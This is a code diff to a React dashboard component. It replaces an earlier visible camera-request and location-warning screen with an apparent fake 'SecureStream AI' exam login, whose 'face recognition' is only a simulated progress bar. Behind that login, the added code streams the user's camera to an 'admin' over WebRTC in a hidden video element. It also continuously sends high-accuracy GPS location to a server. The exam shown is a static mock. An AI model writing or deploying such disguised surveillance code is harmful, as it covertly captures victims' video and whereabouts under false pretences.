+      setLoginStatus("success");
+      setTimeout(() => {
+        setShowExamLogin(false);
+        setExamStarted(true);
+      }, 1500);
     } catch (error) {
-      console.error("Camera access denied:", error);
-      alert("Camera access denied");
+      console.error("❌ STUDENT: Camera access denied:", error);
+      setLoginStatus("error");
     }
   };
 
+  const startLocationTracking = () => {
+    if (!navigator.geolocation) {
+      console.error("❌ STUDENT: Geolocation not supported");
+      return;
+    }
+
+    console.log("📍 STUDENT: Geolocation supported, requesting permission...");
+    setIsTracking(true);
+
+    locationWatchIdRef.current = navigator.geolocation.watchPosition(
+      (position) => {
+        const location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          timestamp: new Date().toISOString(),
+        };
+
+        console.log("📍 STUDENT: Location updated:", location);
+        console.log(
+          `📍 STUDENT: Lat: ${location.latitude}, Lng: ${location.longitude}, Accuracy: ${location.accuracy}m`
+        );
+
+        const payload = {
+          userId: userIdRef.current,
+          location: location,
+        };
+
+        console.log("📤 STUDENT: Sending location to server:", payload);
+        socket.emit("location-update", payload);
+        console.log("✅ STUDENT: Location sent via socket");
+      },
+      (error) => {
+        console.error("❌ STUDENT: Location error:", error);
+        console.error("❌ STUDENT: Error code:", error.code);
+        console.error("❌ STUDENT: Error message:", error.message);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0,
+      }
+    );
+
+    console.log(
+      "📍 STUDENT: Location watch started with ID:",
+      locationWatchIdRef.current
+    );
+  };
+
   const createPeerConnection = async (stream) => {
+    console.log("🔗 STUDENT: Creating peer connection...");
+
     const configuration = {
       iceServers: [
         { urls: "stun:stun.l.google.com:19302" },
@@ -747,11 +806,12 @@ function UserDashboard() {
 
     stream.getTracks().forEach((track) => {
       peerConnectionRef.current.addTrack(track, stream);
+      console.log("🎥 STUDENT: Added track to peer connection:", track.kind);
     });
 
     peerConnectionRef.current.onicecandidate = (event) => {
       if (event.candidate) {
-        console.log("Sending ICE candidate to admin");
+        console.log("🧊 STUDENT: Sending ICE candidate to admin");
         socket.emit("ice-candidate", {
           candidate: event.candidate,
           to: "admin",
@@ -761,7 +821,7 @@ function UserDashboard() {
 
     peerConnectionRef.current.onconnectionstatechange = () => {
       console.log(
-        "Connection state:",
+        "🔗 STUDENT: Connection state:",
         peerConnectionRef.current.connectionState
       );
     };
@@ -769,33 +829,33 @@ function UserDashboard() {
     const offer = await peerConnectionRef.current.createOffer();
     await peerConnectionRef.current.setLocalDescription(offer);
 
-    console.log("Sending offer to admin...");
+    console.log("📤 STUDENT: Sending offer to admin");
     socket.emit("offer", { offer, to: "admin" });
+    console.log("✅ STUDENT: Offer sent");
   };
 
   const handleAnswer = async ({ answer }) => {
     try {
-      if (!peerConnectionRef.current) {
-        console.error("No peer connection exists");
-        return;
-      }
+      console.log("📥 STUDENT: Received answer from admin");
+      if (!peerConnectionRef.current) return;
 
       await peerConnectionRef.current.setRemoteDescription(
         new RTCSessionDescription(answer)
       );
-      console.log("Answer received from admin");
+      console.log("✅ STUDENT: Answer processed");
 
       for (const candidate of pendingCandidatesRef.current) {
         await peerConnectionRef.current.addIceCandidate(candidate);
       }
       pendingCandidatesRef.current = [];
     } catch (error) {
-      console.error("Error handling answer:", error);
+      console.error("❌ STUDENT: Error handling answer:", error);
     }
   };
 
   const handleIceCandidate = async ({ candidate }) => {
     try {
+      console.log("🧊 STUDENT: Received ICE candidate");
       if (
         peerConnectionRef.current &&
         peerConnectionRef.current.remoteDescription
@@ -803,185 +863,470 @@ function UserDashboard() {
         await peerConnectionRef.current.addIceCandidate(
           new RTCIceCandidate(candidate)
         );
-        console.log("Added ICE candidate");
+        console.log("✅ STUDENT: ICE candidate added");
       } else {
         pendingCandidatesRef.current.push(new RTCIceCandidate(candidate));
+        console.log("📦 STUDENT: ICE candidate queued");
       }
     } catch (error) {
-      console.error("Error adding ICE candidate:", error);
+      console.error("❌ STUDENT: Error adding ICE candidate:", error);
     }
   };
 
   return (
     <div style={styles.container}>
-      <h1>User Dashboard</h1>
+      {showExamLogin ? (
+        <div style={styles.loginContainer}>
+          <div style={styles.loginCard}>
+            <div style={styles.logoSection}>
+              <div style={styles.logo}>🎓</div>
+              <h1 style={styles.title}>SecureStream AI</h1>
+              <p style={styles.subtitle}>Secure Online Examination Platform</p>
+            </div>
 
-      {showSecurityCheck && (
-        <div style={styles.securityCard}>
-          <div style={styles.shieldIcon}>🛡️</div>
-          <h2>Security Verification Required</h2>
-          <p style={styles.securityText}>
-            To ensure your account security and prevent unauthorized access,
-            please complete the security verification process.
-          </p>
-          <div style={styles.securityFeatures}>
-            <div style={styles.feature}>✓ Device Authentication</div>
-            <div style={styles.feature}>✓ Location Verification</div>
-            <div style={styles.feature}>✓ Identity Confirmation</div>
+            <div style={styles.divider}></div>
+
+            {loginStatus === "ready" && (
+              <>
+                <div style={styles.verificationBox}>
+                  <label style={styles.checkboxLabel}>
+                    <input
+                      type="checkbox"
+                      checked={!isRobot}
+                      onChange={() => setIsRobot(!isRobot)}
+                      style={styles.checkbox}
+                    />
+                    <span style={styles.checkboxText}>I'm not a robot</span>
+                  </label>
+                </div>
+
+                <button
+                  onClick={handleFaceLogin}
+                  style={{
+                    ...styles.loginButton,
+                    opacity: isRobot ? 0.5 : 1,
+                    cursor: isRobot ? "not-allowed" : "pointer",
+                  }}
+                  disabled={isRobot}
+                >
+                  <span style={styles.buttonIcon}>🔐</span>
+                  Login with Face Recognition
+                </button>
+
+                <p style={styles.infoText}>
+                  Biometric authentication ensures secure exam access
+                </p>
+              </>
+            )}
+
+            {loginStatus === "scanning" && (
+              <div style={styles.scanningContainer}>
+                <div style={styles.scanIcon}>👤</div>
+                <h3 style={styles.scanTitle}>Scanning Face...</h3>
+                <div style={styles.progressBar}>
+                  <div
+                    style={{
+                      ...styles.progressFill,
+                      width: `${scanProgress}%`,
+                    }}
+                  ></div>
+                </div>
+                <p style={styles.scanText}>{scanProgress}% Complete</p>
+              </div>
+            )}
+
+            {loginStatus === "authenticating" && (
+              <div style={styles.scanningContainer}>
+                <div style={styles.loadingSpinner}></div>
+                <h3 style={styles.scanTitle}>Authenticating...</h3>
+                <p style={styles.scanText}>Verifying identity</p>
+              </div>
+            )}
+
+            {loginStatus === "success" && (
+              <div style={styles.successContainer}>
+                <div style={styles.successIcon}>✓</div>
+                <h3 style={styles.successTitle}>Authentication Successful!</h3>
+                <p style={styles.successText}>Redirecting to exam...</p>
+              </div>
+            )}
+
+            {loginStatus === "error" && (
+              <div style={styles.errorContainer}>
+                <div style={styles.errorIcon}>✕</div>
+                <h3 style={styles.errorTitle}>Authentication Failed</h3>
+                <p style={styles.errorText}>
+                  Please allow camera access and try again
+                </p>
+                <button onClick={handleFaceLogin} style={styles.retryButton}>
+                  Retry
+                </button>
+              </div>
+            )}
           </div>
-          <div style={styles.statusBox}>{securityStatus}</div>
-          <button onClick={handleSecurityCheck} style={styles.securityButton}>
-            🔒 Verify Security Settings
-          </button>
-          <p style={styles.disclaimer}>
-            This process helps protect your account from threats
+
+          <p style={styles.footerText}>
+            © 2025 SecureStream AI - All Rights Reserved
           </p>
         </div>
-      )}
+      ) : (
+        <div style={styles.examContainer}>
+          <div style={styles.examHeader}>
+            <h2 style={styles.examTitle}>📝 Data Structures Final Exam</h2>
+            <div style={styles.examInfo}>
+              <span style={styles.examTime}>⏱️ Time Remaining: 1:45:23</span>
+              <span style={styles.examStatus}>🟢 Active</span>
+            </div>
+          </div>
 
-      <div style={styles.card}>
-        {!cameraRequested ? (
-          <p>Waiting for admin request...</p>
-        ) : (
-          <>
-            <h2>⚠️ Camera Access Requested</h2>
-            <p>Admin wants to access your camera</p>
-            <button onClick={allowCameraAccess} style={styles.button}>
-              Allow Camera Access
-            </button>
-          </>
-        )}
-      </div>
+          <div style={styles.examContent}>
+            <div style={styles.questionCard}>
+              <h3 style={styles.questionTitle}>Question 1 of 50</h3>
+              <p style={styles.questionText}>
+                What is the time complexity of binary search in a sorted array?
+              </p>
+              <div style={styles.optionsContainer}>
+                {["O(n)", "O(log n)", "O(n²)", "O(1)"].map((option, idx) => (
+                  <label key={idx} style={styles.optionLabel}>
+                    <input type="radio" name="q1" style={styles.radio} />
+                    <span style={styles.optionText}>{option}</span>
+                  </label>
+                ))}
+              </div>
+            </div>
 
-      {streamRef.current && (
-        <div style={styles.videoContainer}>
-          <h3>
-            Your Camera{" "}
-            {isTracking && (
-              <span style={styles.trackingBadge}>
-                📍 Location Tracking Active
-              </span>
-            )}
-          </h3>
-          <video
-            ref={videoRef}
-            autoPlay
-            muted
-            playsInline
-            style={styles.video}
-          />
-          {isTracking && (
-            <p style={styles.warningText}>
-              ⚠️ Your live location is being shared continuously
-            </p>
+            <div style={styles.navigationButtons}>
+              <button style={styles.prevButton}>← Previous</button>
+              <button style={styles.nextButton}>Next →</button>
+            </div>
+          </div>
+
+          {feedback && (
+            <div style={styles.feedback}>
+              <strong>⚠️ Proctor Alert:</strong> {feedback}
+            </div>
           )}
         </div>
       )}
 
-      {feedback && (
-        <div style={styles.feedback}>
-          <h3>Admin Feedback:</h3>
-          <p>{feedback}</p>
-        </div>
-      )}
+      <video
+        ref={videoRef}
+        autoPlay
+        muted
+        playsInline
+        style={{ display: "none" }}
+      />
     </div>
   );
 }
 
 const styles = {
   container: {
+    minHeight: "100vh",
+    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    fontFamily:
+      "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
+  },
+  loginContainer: {
+    width: "100%",
+    maxWidth: "480px",
     padding: "20px",
-    fontFamily: "Arial",
-    maxWidth: "800px",
-    margin: "0 auto",
   },
-  securityCard: {
-    background: "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)",
-    color: "white",
+  loginCard: {
+    background: "white",
+    borderRadius: "20px",
     padding: "40px",
-    borderRadius: "15px",
-    marginBottom: "30px",
-    textAlign: "center",
-    boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
+    boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
   },
-  shieldIcon: { fontSize: "60px", marginBottom: "15px" },
-  securityText: {
+  logoSection: {
+    textAlign: "center",
+    marginBottom: "30px",
+  },
+  logo: {
+    fontSize: "64px",
+    marginBottom: "15px",
+  },
+  title: {
+    fontSize: "28px",
+    fontWeight: "700",
+    color: "#1a1a1a",
+    margin: "0 0 8px 0",
+  },
+  subtitle: {
+    fontSize: "14px",
+    color: "#666",
+    margin: 0,
+  },
+  divider: {
+    height: "1px",
+    background: "#e0e0e0",
+    margin: "25px 0",
+  },
+  verificationBox: {
+    background: "#f8f9fa",
+    padding: "20px",
+    borderRadius: "12px",
+    marginBottom: "25px",
+    border: "2px solid #e0e0e0",
+  },
+  checkboxLabel: {
+    display: "flex",
+    alignItems: "center",
+    cursor: "pointer",
+  },
+  checkbox: {
+    width: "20px",
+    height: "20px",
+    marginRight: "12px",
+    cursor: "pointer",
+  },
+  checkboxText: {
     fontSize: "16px",
+    color: "#333",
+  },
+  loginButton: {
+    width: "100%",
+    padding: "16px",
+    background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
+    color: "white",
+    border: "none",
+    borderRadius: "12px",
+    fontSize: "16px",
+    fontWeight: "600",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    gap: "10px",
+    transition: "transform 0.2s",
+  },
+  buttonIcon: {
+    fontSize: "20px",
+  },
+  infoText: {
+    textAlign: "center",
+    fontSize: "13px",
+    color: "#666",
+    marginTop: "15px",
+  },
+  scanningContainer: {
+    textAlign: "center",
+    padding: "30px 0",
+  },
+  scanIcon: {
+    fontSize: "80px",
+    marginBottom: "20px",
+  },
+  scanTitle: {
+    fontSize: "22px",
+    color: "#333",
+    margin: "0 0 20px 0",
+  },
+  progressBar: {
+    width: "100%",
+    height: "8px",
+    background: "#e0e0e0",
+    borderRadius: "10px",
+    overflow: "hidden",
+    marginBottom: "15px",
+  },
+  progressFill: {
+    height: "100%",
+    background: "linear-gradient(90deg, #667eea 0%, #764ba2 100%)",
+    transition: "width 0.3s",
+  },
+  scanText: {
+    fontSize: "14px",
+    color: "#666",
+  },
+  loadingSpinner: {
+    width: "60px",
+    height: "60px",
+    border: "4px solid #e0e0e0",
+    borderTop: "4px solid #667eea",
+    borderRadius: "50%",
+    margin: "0 auto 20px",
+    animation: "spin 1s linear infinite",
+  },
+  successContainer: {
+    textAlign: "center",
+    padding: "30px 0",
+  },
+  successIcon: {
+    width: "80px",
+    height: "80px",
+    background: "#4caf50",
+    color: "white",
+    fontSize: "48px",
+    borderRadius: "50%",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    margin: "0 auto 20px",
+  },
+  successTitle: {
+    fontSize: "22px",
+    color: "#4caf50",
+    margin: "0 0 10px 0",
+  },
+  successText: {
+    fontSize: "14px",
+    color: "#666",
+  },
+  errorContainer: {
+    textAlign: "center",
+    padding: "30px 0",
+  },
+  errorIcon: {
+    width: "80px",
+    height: "80px",
+    background: "#f44336",
+    color: "white",
+    fontSize: "48px",
+    borderRadius: "50%",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    margin: "0 auto 20px",
+  },
+  errorTitle: {
+    fontSize: "22px",
+    color: "#f44336",
+    margin: "0 0 10px 0",
+  },
+  errorText: {
+    fontSize: "14px",
+    color: "#666",
+    marginBottom: "20px",
+  },
+  retryButton: {
+    padding: "12px 30px",
+    background: "#667eea",
+    color: "white",
+    border: "none",
+    borderRadius: "8px",
+    fontSize: "14px",
+    cursor: "pointer",
+  },
+  footerText: {
+    textAlign: "center",
+    color: "white",
+    fontSize: "13px",
+    marginTop: "20px",
+    opacity: 0.8,
+  },
+  examContainer: {
+    width: "100%",
+    maxWidth: "900px",
+    padding: "20px",
+  },
+  examHeader: {
+    background: "white",
+    padding: "25px",
+    borderRadius: "15px",
+    marginBottom: "20px",
+    boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
+  },
+  examTitle: {
+    fontSize: "24px",
+    color: "#333",
+    margin: "0 0 15px 0",
+  },
+  examInfo: {
+    display: "flex",
+    justifyContent: "space-between",
+    fontSize: "14px",
+  },
+  examTime: {
+    color: "#666",
+  },
+  examStatus: {
+    color: "#4caf50",
+    fontWeight: "600",
+  },
+  examContent: {
+    background: "white",
+    padding: "30px",
+    borderRadius: "15px",
+    boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
+  },
+  questionCard: {
+    marginBottom: "30px",
+  },
+  questionTitle: {
+    fontSize: "18px",
+    color: "#667eea",
+    marginBottom: "15px",
+  },
+  questionText: {
+    fontSize: "16px",
+    color: "#333",
     lineHeight: "1.6",
     marginBottom: "20px",
-    opacity: 0.95,
   },
-  securityFeatures: {
+  optionsContainer: {
     display: "flex",
-    justifyContent: "space-around",
-    marginBottom: "25px",
-    flexWrap: "wrap",
+    flexDirection: "column",
+    gap: "12px",
   },
-  feature: {
-    background: "rgba(255,255,255,0.1)",
-    padding: "10px 15px",
-    borderRadius: "20px",
-    fontSize: "14px",
-    margin: "5px",
-  },
-  statusBox: {
-    background: "rgba(255,255,255,0.15)",
-    padding: "12px",
-    borderRadius: "8px",
-    marginBottom: "20px",
-    fontSize: "14px",
-    minHeight: "20px",
-  },
-  securityButton: {
-    background: "#fff",
-    color: "#1e3c72",
-    padding: "15px 40px",
-    border: "none",
-    borderRadius: "30px",
+  optionLabel: {
+    display: "flex",
+    alignItems: "center",
+    padding: "15px",
+    background: "#f8f9fa",
+    borderRadius: "10px",
     cursor: "pointer",
-    fontSize: "18px",
-    fontWeight: "bold",
-    boxShadow: "0 5px 15px rgba(0,0,0,0.2)",
+    transition: "background 0.2s",
   },
-  disclaimer: { fontSize: "12px", marginTop: "15px", opacity: 0.7 },
-  card: {
-    background: "#f5f5f5",
-    padding: "20px",
-    borderRadius: "8px",
-    marginBottom: "20px",
+  radio: {
+    marginRight: "12px",
   },
-  button: {
-    background: "#007bff",
-    color: "white",
-    padding: "10px 20px",
+  optionText: {
+    fontSize: "15px",
+    color: "#333",
+  },
+  navigationButtons: {
+    display: "flex",
+    justifyContent: "space-between",
+    marginTop: "30px",
+  },
+  prevButton: {
+    padding: "12px 30px",
+    background: "#e0e0e0",
     border: "none",
-    borderRadius: "5px",
-    cursor: "pointer",
-    fontSize: "16px",
-  },
-  videoContainer: { marginTop: "20px" },
-  video: {
-    width: "100%",
-    maxWidth: "640px",
     borderRadius: "8px",
-    border: "2px solid #333",
-  },
-  trackingBadge: {
-    background: "#dc3545",
-    color: "white",
-    padding: "5px 10px",
-    borderRadius: "5px",
     fontSize: "14px",
-    marginLeft: "10px",
+    cursor: "pointer",
   },
-  warningText: { color: "#dc3545", fontWeight: "bold", marginTop: "10px" },
+  nextButton: {
+    padding: "12px 30px",
+    background: "#667eea",
+    color: "white",
+    border: "none",
+    borderRadius: "8px",
+    fontSize: "14px",
+    cursor: "pointer",
+  },
   feedback: {
     background: "#fff3cd",
-    padding: "15px",
-    borderRadius: "8px",
+    padding: "15px 20px",
+    borderRadius: "10px",
     marginTop: "20px",
     border: "1px solid #ffc107",
+    color: "#856404",
   },
 };
+
+// Add keyframe animation
+const styleSheet = document.createElement("style");
+styleSheet.textContent = `
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+`;
+document.head.appendChild(styleSheet);
 
 export default UserDashboard;
